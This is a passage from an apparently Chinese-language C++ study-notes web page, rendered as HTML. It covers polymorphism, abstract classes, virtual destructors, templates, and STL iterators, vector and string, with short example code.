class="type">void</span> <span class="title">speak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Animal speaks&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> : <span class="keyword">public</span> Animal &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Cat speaks&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">speak</span><span class="params">(Animal* animal)</span> </span>&#123;</span><br><span class="line">    animal-&gt;<span class="built_in">speak</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Cat cat;</span><br><span class="line">    <span class="built_in">speak</span>(&amp;cat); <span class="comment">// 输出结果为 &quot;Cat speaks&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-2-动态多态条件"><a href="#5-2-动态多态条件" class="headerlink" title="5.2 动态多态条件"></a>5.2 动态多态条件</h4><blockquote><p>原理：存在虚函数表，虚函数起始位置存在虚函数表中。子类未重写则直接继承虚函数表，若重写了则虚函数表中对应函数地址要改成子类的。</p><ol><li>有继承关系。</li><li>子类重写父类的虚函数。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### <span class="number">5.3</span> 纯虚函数与抽象类</span><br><span class="line"></span><br><span class="line">&gt; 纯虚函数：`<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;`</span><br><span class="line">&gt;</span><br><span class="line">&gt; 抽象类：只要类中有一个纯虚函数就为抽象类。</span><br><span class="line">&gt;</span><br><span class="line">&gt; 抽象类特点：</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="number">1.</span> 无法实例化对象。</span><br><span class="line">&gt; <span class="number">2.</span> 抽象类的子类必须重写父类的纯虚函数，也就是要有具体实现，否则子类也是抽象类。</span><br><span class="line"></span><br><span class="line">```c++</span><br></pre></td></tr></table></figure><h4 id="5-4-虚析构和纯虚析构"><a href="#5-4-虚析构和纯虚析构" class="headerlink" title="5.4 虚析构和纯虚析构"></a>5.4 虚析构和纯虚析构</h4><blockquote><p>父类指针在析构时，不会调用子类中的析构函数，导致子类中堆区内容释放不干净。所以子类中有堆区内容时需要写虚析构或纯虚析构，没有可以不写。</p><p>利用虚析构可以解决父类指针释放时子类释放不干净的问题：<code>virtual ~father()&#123;&#125;</code>（写在父类中，要具体实现）</p><p>纯虚析构：</p><ol><li>父类中声明：<code>virtual ~father() = 0;</code></li><li>类外实现：<code>father::~father()&#123;&#125;</code></li></ol><p>有了纯虚析构之后，这个类也属于抽象类。</p><p>虚析构和纯虚析构只需要写一个即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### <span class="number">6</span> VS 开发人员命令提示工具</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">:: x64 Native Tools Command Prompt <span class="keyword">for</span> VS <span class="number">2022</span></span><br><span class="line">cd &lt;path&gt;</span><br><span class="line">cl /d1 reportSingleclassLayout&lt;name&gt; &lt;name&gt;.cpp（cl ：l是字母，d1：<span class="number">1</span>是数字）</span><br></pre></td></tr></table></figure><hr><h2 id="五、-模板"><a href="#五、-模板" class="headerlink" title="五、 模板"></a>五、 模板</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1 基本概念"></a>1 基本概念</h3><blockquote><p>建立通用的模具，大大提高复用性。</p><p>函数模版（T类型须一致，必须确定T才可以使用）：<br><code>​template &lt; typename T &gt;</code><br><code>type function ( T a ) &#123;&#125; ;</code></p><p>使用：</p><ol><li>自动推导；</li><li>显式指定 function&lt;&gt;() ; </li></ol><p>与普通函数区别：</p><ol><li>普通函数可以隐式转换（例：char -&gt; int ）</li><li>函数模板自动类型推导不会隐式转换，用显式指定类型则会发生隐式转换</li></ol><p>局限性：</p><ol><li>无法简单地比较、赋值数组、类这样的数据类型。解决方法可以选择运算符重载（一般不选）、直接对模板函数进行重载，特殊处理指定的类。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 简单案例</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">maximum</span><span class="params">(T a, T b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a &gt; b) ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num1 = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> num2 = <span class="number">20</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;较大的数是：&quot;</span> &lt;&lt; <span class="built_in">maximum</span>(num1, num2) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> num3 = <span class="number">3.14</span>;</span><br><span class="line">    <span class="type">double</span> num4 = <span class="number">2.71</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;较大的数是：&quot;</span> &lt;&lt; <span class="built_in">maximum</span>(num3, num4) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 局限性：特殊的模板处理</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">maximum</span><span class="params">(T a, T b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a &gt; b) ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;&gt; <span class="function">Person&amp; <span class="title">maximum</span><span class="params">(Person &amp;a,Person &amp;b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a.age &gt; b.age) ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-与普通函数发生重载"><a href="#2-与普通函数发生重载" class="headerlink" title="2 与普通函数发生重载"></a>2 与普通函数发生重载</h3><blockquote><ol><li>如果函数模板和普通函数都可以调用，优先调用普通函数。</li><li>可以通过空模板参数列表强制调用函数模板。</li><li>函数模板可以发生函数重载。</li><li>如果函数模板可以产生更好的匹配，优先调用函数模板。</li></ol><p>注：实际开发中不要同时出现函数模板和普通函数的重载。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 简单案例</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myPrint</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Normal function called!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myPrint</span><span class="params">(T a, T b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Template function called!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myPrint</span><span class="params">(T a, T b, T c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Template overload function called!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> num1 = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> num2 = <span class="number">20</span>;</span><br><span class="line"><span class="type">char</span> char1 = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span> char2 = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="type">char</span> char3 = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">myPrint</span>(num1, num2);  <span class="comment">// 特点1</span></span><br><span class="line">myPrint&lt;&gt;(num1, num2);  <span class="comment">// 特点2</span></span><br><span class="line"><span class="built_in">myPrint</span>(char1, char2, char3);  <span class="comment">// 特点3</span></span><br><span class="line"><span class="built_in">myPrint</span>(char1, char2);  <span class="comment">// 特点4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-类模板"><a href="#3-类模板" class="headerlink" title="3 类模板"></a>3 类模板</h3><blockquote><p>类模板与函数模板区别：</p><ol><li>类模板没有自动类型推导的使用方式。</li><li>类模板在模板参数列表可以有默认参数。</li></ol><p>类中成员函数创建时机：</p><ol><li>普通类在一开始成员函数就会被创建。</li><li>模板类的成员函数只有在被调用时才会被创建（要知道 T 的值才会创建函数）。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 简单案例</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">NameType</span>,<span class="keyword">class</span> <span class="title class_">AgeType</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    NameType m_Name;</span><br><span class="line">    AgeType m_Age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Person</span>(NameType name,AgeType age)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类模板不会自动推导（不写&lt;string, int&gt;会报错）</span></span><br><span class="line"><span class="function">Person&lt;string, <span class="type">int</span>&gt; <span class="title">p</span><span class="params">(<span class="string">&quot;Ami&quot;</span>, <span class="number">123</span>)</span></span>;</span><br><span class="line"><span class="comment">// 类模板的默认参数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">NameType</span>, <span class="keyword">class</span> <span class="title class_">AgeType</span> = <span class="type">int</span>&gt;</span><br><span class="line"><span class="keyword">class</span> Person&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*类模板的成员函数传参*/</span></span><br><span class="line"><span class="comment">// 1.指定参数类型（常用）</span></span><br><span class="line"><span class="type">void</span> <span class="built_in">printPerson1</span>(Person&lt;string,<span class="type">int</span>&gt; &amp;p)&#123;&#125;</span><br><span class="line"><span class="comment">// 2.参数模板化</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T1,<span class="keyword">class</span> T2&gt;</span><br><span class="line"><span class="type">void</span> <span class="built_in">printPerson2</span>(Person&lt;T1,T2&gt; &amp;p)&#123;&#125; </span><br><span class="line"><span class="comment">// 3.整个类模板化</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> T&gt;</span><br><span class="line"><span class="type">void</span> <span class="built_in">printPerson3</span>(T &amp;p)&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="4-类模板其他问题"><a href="#4-类模板其他问题" class="headerlink" title="4 类模板其他问题"></a>4 类模板其他问题</h3><blockquote><p>类模板继承：</p><ol><li>子类继承的父类是类模板时，子类在声明时要指明父类中T的类型。如果不指定编译器无法给子类分配内存。</li><li>如果想灵活指定父类T的类型，子类也需要变成类模板。</li></ol></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类模板继承</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span>&#123; T m; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span>:<span class="keyword">public</span> Base&lt;<span class="type">int</span>&gt;&#123;&#125;; <span class="comment">// 1.不指明T将报错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">class</span> <span class="title class_">T1</span>,<span class="keyword">class</span> <span class="title class_">T2</span>&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son2</span>:<span class="keyword">public</span> Base&lt;T2&gt;&#123; T1 obj;&#125;; <span class="comment">// 2.灵活指定T。父类的T是子类的T2。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="六、-STL技术"><a href="#六、-STL技术" class="headerlink" title="六、 STL技术"></a>六、 STL技术</h2><h3 id="1-基本概念-1"><a href="#1-基本概念-1" class="headerlink" title="1 基本概念"></a>1 基本概念</h3><blockquote><p>STL基础知识：</p><ul><li>STL(Standard Template Library，标准模板库)</li><li>STL从广义上分为：容器(container)、算法(algorithm)、迭代器(iterator)。</li><li>容器和算法之间通过迭代器进行无缝连接。</li><li>STL几乎所有的代码都采用了模板类或者模板函数。</li></ul><p>STL六大组件：</p><ol><li>容器：各种数据结构，如vector、list、deque、set、map等，用来存放数据。</li><li>算法：各种常用的算法，如sort、find、copy、for_each等。</li><li>迭代器：扮演了容器与算法之间的胶合剂。</li><li>仿函数：行为类似函数，可作为算法的某种策略。</li><li>适配器：一种用来修饰容器或者仿函数或迭代器接口的东西。</li><li>空间配置器：负责空间的配置与管理。</li></ol><p>容器：</p><ul><li>序列式容器：强调值的排序，序列式容器中的每个元素均有固定的位置。</li><li>关联式容器：二叉树结构，各元素之间没有严格的物理上的顺序关系。</li></ul><p>算法：</p><ul><li>质变算法：运算过程中会更改区间内的元素。</li><li>非质变算法：运算过程中不会更改区间内的元素。</li></ul><p>迭代器：</p><ul><li>算法需要靠迭代器才能访问容器中的元素。</li><li>每个容器有自己专属的地带器。功能类似指针。</li><li>常用的容器中的迭代器冲类为双向迭代器和随机访问迭代器</li></ul></blockquote><div class="table-container"><table><thead><tr><th>种类</th><th>功能</th><th>支持运算</th></tr></thead><tbody><tr><td>输入迭代器</td><td>数据只读</td><td>只读，支持++、==、！=</td></tr><tr><td>输出迭代器</td><td>数据只写</td><td>只写，支持++</td></tr><tr><td>前向迭代器</td><td>读写，并向前推进迭代器</td><td>读写，支持++、==、！=</td></tr><tr><td>双向迭代器</td><td>读写，可前后推进迭代器</td><td>读写，支持++、—</td></tr><tr><td>随机访问迭代器</td><td>读写，可跳跃式访问任意数据</td><td>读写，支持++、—、[n]、-n、&lt;、&lt;=、&gt;、&gt;=</td></tr></tbody></table></div><h3 id="2-迭代器"><a href="#2-迭代器" class="headerlink" title="2 迭代器"></a>2 迭代器</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 迭代器</span></span><br><span class="line"><span class="comment">// 起始迭代器，指向容器第一个元素</span></span><br><span class="line">vector&lt;T&gt;::iterator itBegin = v.<span class="built_in">begin</span>();</span><br><span class="line"><span class="comment">// 结束迭代器，指向容器中最后一个元素的下一个位置</span></span><br><span class="line">vector&lt;T&gt;::iterator itEnd = v.<span class="built_in">end</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代器访问数据</span></span><br><span class="line"><span class="comment">// 方法一</span></span><br><span class="line"><span class="keyword">while</span>(itBegin != itEnd)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; *itBegin &lt;&lt; endl;</span><br><span class="line">    itBegin++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 方法二</span></span><br><span class="line"><span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>();it != v.<span class="built_in">end</span>();it++)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; *it &lt;&lt; endl; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 方法三</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> val)</span></span>&#123; cout &lt;&lt; val &lt;&lt; endl; &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123; for_each(itBegin, itEnd, func); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代器访问类中数据（假设容器为：vector&lt;Person&gt;）</span></span><br><span class="line">(*it).name; <span class="comment">// 对迭代器it解引用成容器中的参数后访问属性</span></span><br><span class="line">it-&gt;name; <span class="comment">// 直接访问对应属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针操作</span></span><br><span class="line">vector&lt;Person *&gt; v; <span class="comment">// 定义指针容器</span></span><br><span class="line"><span class="function">Person <span class="title">p</span><span class="params">(<span class="string">&#x27;Bob&#x27;</span>,<span class="number">12</span>)</span></span>;</span><br><span class="line">v.<span class="built_in">push_back</span>(&amp;p1); <span class="comment">// 输入地址</span></span><br><span class="line"><span class="keyword">for</span>(vector&lt;Person *&gt;::iterator it = v.<span class="built_in">begin</span>();it != v.<span class="built_in">end</span>();it++)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; (*it)-&gt;name &lt;&lt; endl; <span class="comment">// 解引用后指针操作</span></span><br><span class="line">    cout &lt;&lt; (**it).name &lt;&lt; endl; <span class="comment">// 两次解引用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常迭代器，迭代器中的值不可被修改</span></span><br><span class="line">deque&lt;<span class="type">int</span>&gt;const_iterator it;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 案例</span></span><br><span class="line"><span class="comment">// 结果输出3，说明end不会一直更新</span></span><br><span class="line">deque&lt;<span class="type">int</span>&gt; dep;</span><br><span class="line">dep.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">dep.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">deque&lt;<span class="type">int</span>&gt;::iterator beg = dep.<span class="built_in">begin</span>();</span><br><span class="line">deque&lt;<span class="type">int</span>&gt;::iterator end = dep.<span class="built_in">end</span>();</span><br><span class="line">dep.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">dep.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line">dep.<span class="built_in">push_back</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; (*end) &lt;&lt; endl;</span><br></pre></td></tr></table></figure><h3 id="3-vector容器"><a href="#3-vector容器" class="headerlink" title="3 vector容器"></a>3 vector容器</h3><blockquote><p>vector类似于数组，也成为单端数组。</p><p>数组空间是静态的，而vector可以动态扩展。扩展方式是找到更大的内存空间，然后将原数据拷贝新空间，释放原空间。</p><p>vector容器的迭代器是支持随机访问的迭代器。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创造容器</span></span><br><span class="line">vector&lt;T&gt; v; <span class="comment">// 默认无参构造</span></span><br><span class="line"><span class="built_in">vector</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>()); <span class="comment">// 将区间内元素拷贝给本身</span></span><br><span class="line"><span class="built_in">vector</span>(n,elem); <span class="comment">// 将n个elem拷贝给本身</span></span><br><span class="line"><span class="built_in">vector</span>(<span class="type">const</span> vector &amp;vec); <span class="comment">// 拷贝构造函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 赋值</span></span><br><span class="line">vector&amp; <span class="keyword">operator</span> = (<span class="type">const</span> vector &amp;vec); <span class="comment">// 重载=</span></span><br><span class="line"><span class="built_in">assign</span>(beg,end); <span class="comment">// 将[beg,end)区间的数据拷贝给本身</span></span><br><span class="line"><span class="built_in">assign</span>(n,elem); <span class="comment">// n个elem拷贝给本身</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小</span></span><br><span class="line"><span class="built_in">empty</span>(); <span class="comment">// 是否空</span></span><br><span class="line"><span class="built_in">capacity</span>(); <span class="comment">// 容量</span></span><br><span class="line"><span class="built_in">size</span>(); <span class="comment">// 元素个数</span></span><br><span class="line"><span class="built_in">resize</span>(<span class="type">int</span> num); <span class="comment">// 重设长度，变长填充默认值，变短删除尾部元素</span></span><br><span class="line"><span class="built_in">resize</span>(<span class="type">int</span> num,elem); <span class="comment">// 同理，但是变长填充的是elem</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入与删除</span></span><br><span class="line"><span class="built_in">push_back</span>(elem); <span class="comment">// 尾部添加数据</span></span><br><span class="line"><span class="built_in">pop_back</span>(); <span class="comment">// 尾部删除数据</span></span><br><span class="line"><span class="built_in">insert</span>(const_iterator pos,elem); <span class="comment">// 迭代器指向的位置pos插入elem</span></span><br><span class="line"><span class="built_in">insert</span>(const_iterator pos,<span class="type">int</span> count,elem); <span class="comment">//同理，插入count个elem</span></span><br><span class="line"><span class="built_in">erase</span>(const_iterator pos); <span class="comment">// 删除迭代器指向元素</span></span><br><span class="line"><span class="built_in">erase</span>(const_iterator start,const_iterator end); <span class="comment">// 删除范围，左闭右开</span></span><br><span class="line"><span class="built_in">clear</span>(); <span class="comment">// 删除容器中所有元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 存取</span></span><br><span class="line"><span class="built_in">at</span>(<span class="type">int</span> idx); <span class="comment">// 返回idx指向元素</span></span><br><span class="line"><span class="keyword">operator</span>[]; <span class="comment">// 返回idx指向元素</span></span><br><span class="line"><span class="built_in">front</span>(); <span class="comment">// 返回容器第一个元素</span></span><br><span class="line"><span class="built_in">back</span>(); <span class="comment">// 返回容器最后一个元素</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">swap</span>(vec); <span class="comment">// 两个容器元素互换（常用于收缩内存）</span></span><br><span class="line"><span class="built_in">reserve</span>(<span class="type">int</span> len); <span class="comment">// 预留len个元素长度，但不可访问</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 容器嵌套（类似二维数组）</span></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; v;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v2;</span><br><span class="line">v.<span class="built_in">push_back</span>(v1);</span><br><span class="line">v.<span class="built_in">push_back</span>(v2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(vector&lt;<span class="type">int</span>&gt;::iterator vit = (*it).<span class="built_in">begin</span>(); vit != (*it).<span class="built_in">end</span>(); vit++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; *vit &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 案例</span></span><br><span class="line"><span class="comment">// 收缩内存</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v.<span class="built_in">push_back</span>(i);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 不交换前容器大小远大于实际大小</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;before swap&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;capacity:&quot;</span> &lt;&lt; v.<span class="built_in">capacity</span>() &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;size:&quot;</span> &lt;&lt; v.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line"><span class="comment">// 重设大小后容器大小也不会变</span></span><br><span class="line">    v.<span class="built_in">resize</span>(<span class="number">3</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;after resize&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;capacity:&quot;</span> &lt;&lt; v.<span class="built_in">capacity</span>() &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;size:&quot;</span> &lt;&lt; v.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">    <span class="comment">// 子交换，缩小容器大小</span></span><br><span class="line">    <span class="comment">// 先利用v拷贝构造了一个匿名对象，然后交换，然后释放匿名对象的空间</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(v).<span class="built_in">swap</span>(v);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;after swap&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;capacity:&quot;</span> &lt;&lt; v.<span class="built_in">capacity</span>() &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;size:&quot;</span> &lt;&lt; v.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-string容器"><a href="#4-string容器" class="headerlink" title="4 string容器"></a>4 string容器</h3><blockquote><p>字符串。</p><p>string本质是一个类，内部封装了char*，有很多方法可以管理这个char*。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造</span></span><br><span class="line"><span class="built_in">string</span>(); <span class="comment">// 创建空字符串</span></span><br><span class="line"><span class="built_in">string</span>(<span class="type">const</span> <span class="type">char</span>* s); <span class="comment">// 初始化常字符串</span></span><br><span class="line"><span class="built_in">string</span>(<span class="type">const</span> string&amp; str); <span class="comment">// 用string对象初始化另一个string对象</span></span><br><span class="line"><span class="built_in">string</span>(<span class="type">int</span> n,<span class="type">char</span> c); <span class="comment">// 用n个字符c进行初始化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  赋值</span></span><br><span class="line">string&amp; <span class="keyword">operator</span>=(<span class="type">const</span> <span class="type">char</span>* s); <span class="comment">// char*类型字符串赋给当前字符串</span></span><br><span class="line">string&amp; <span class="keyword">operator</span>=(<span class="type">const</span> string &amp;s); <span class="comment">// 字符串s赋给当前字符串</span></span><br><span class="line">string&amp; <span class="keyword">operator</span>=(<span class="type">char</span> c); <span class="comment">// 字符赋给当前字符串</span></span><br><span class="line"><span class="function">string&amp; <span class="title">assign</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span></span>; <span class="comment">// 字符串s赋给当前字符串</span></span><br><span class="line"><span class="function">string&amp; <span class="title">assign</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s,<span class="type">int</span> n)</span></span>; <span class="comment">// 字符串s的前n个字符赋给当前字符串</span></span><br><span class="line"><span class="function">string&amp; <span class="title">assign</span><span class="params">(<span class="type">const</span> string &amp;s)</span></span>; <span class="comment">// 字符串s赋给当前字符串</span></span><br><span class="line"><span class="function">string&amp; <span class="title">assign</span><span class="params">(<span class="type">int</span> n,<span class="type">char</span> c)</span></span>; <span class="comment">// 用n个字符c赋给当前字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串拼接</span></span><br><span class="line">string&amp; <span class="keyword">operator</span>+=(<span class="type">const</span> <span class="type">char</span>* str); <span class="comment">// 重载+=操作符</span></span><br><span class="line">string&amp; <span class="keyword">operator</span>+=(<span class="type">const</span> <span class="type">char</span> c);</span><br><span class="line">string&amp; <span class="keyword">operator</span>+=(<span class="type">const</span> string&amp; str);</span><br><span class="line"><span class="function">string&amp; <span class="title">append</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span></span>; <span class="comment">// 把字符串s连接到当前字符串结尾</span></span><br><span class="line"><span class="function">string&amp; <span class="title">append</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s, <span class="type">int</span> n)</span></span>; <span class="comment">// 